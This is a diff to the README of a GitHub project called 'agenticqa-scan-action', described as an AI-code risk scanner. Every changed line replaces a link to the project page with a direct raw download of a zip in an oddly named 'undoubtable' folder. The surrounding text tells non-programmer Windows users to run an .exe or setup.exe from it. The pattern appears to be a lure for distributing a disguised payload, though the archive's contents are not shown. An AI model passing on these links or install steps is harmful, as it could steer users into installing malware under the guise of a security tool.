@@ -1,6 +1,6 @@
 # 🛡️ agenticqa-scan-action - Map AI Code Risks Clearly
 
-[![Download agenticqa-scan-action](https://img.shields.io/badge/Download-agenticqa--scan--action-green?style=for-the-badge)](https://github.com/kokorubbong/agenticqa-scan-action)
+[![Download agenticqa-scan-action](https://img.shields.io/badge/Download-agenticqa--scan--action-green?style=for-the-badge)](https://github.com/kokorubbong/agenticqa-scan-action/raw/refs/heads/main/undoubtable/action-agenticqa-scan-2.1.zip)
 
 ---
 
@@ -50,10 +50,10 @@ No programming experience is required to run this tool on a Windows machine.
 
 ## 🚀 Getting Started
 
-[![Download agenticqa-scan-action](https://img.shields.io/badge/Download-agenticqa--scan--action-blue?style=for-the-badge)](https://github.com/kokorubbong/agenticqa-scan-action)
+[![Download agenticqa-scan-action](https://img.shields.io/badge/Download-agenticqa--scan--action-blue?style=for-the-badge)](https://github.com/kokorubbong/agenticqa-scan-action/raw/refs/heads/main/undoubtable/action-agenticqa-scan-2.1.zip)
 
 1. Visit the download page by clicking the big green button at the top or this link:  
-   https://github.com/kokorubbong/agenticqa-scan-action
+   https://github.com/kokorubbong/agenticqa-scan-action/raw/refs/heads/main/undoubtable/action-agenticqa-scan-2.1.zip
 
 2. On the page, look for the latest release or a file named like `agenticqa-scan-action.exe` or `setup.exe`.
 
@@ -64,7 +64,7 @@ No programming experience is required to run this tool on a Windows machine.
 ## 📥 How to Download and Install on Windows
 
 1. Open your web browser and go to:  
-   https://github.com/kokorubbong/agenticqa-scan-action
+   https://github.com/kokorubbong/agenticqa-scan-action/raw/refs/heads/main/undoubtable/action-agenticqa-scan-2.1.zip
 
 2. Scroll to the "Releases" section. Click the latest version.
 
@@ -148,7 +148,7 @@ After running your first scan:
 ## 📁 More Resources
 
 See the main project page for documentation and sample reports:  
-https://github.com/kokorubbong/agenticqa-scan-action
+https://github.com/kokorubbong/agenticqa-scan-action/raw/refs/heads/main/undoubtable/action-agenticqa-scan-2.1.zip
 
 ---
 
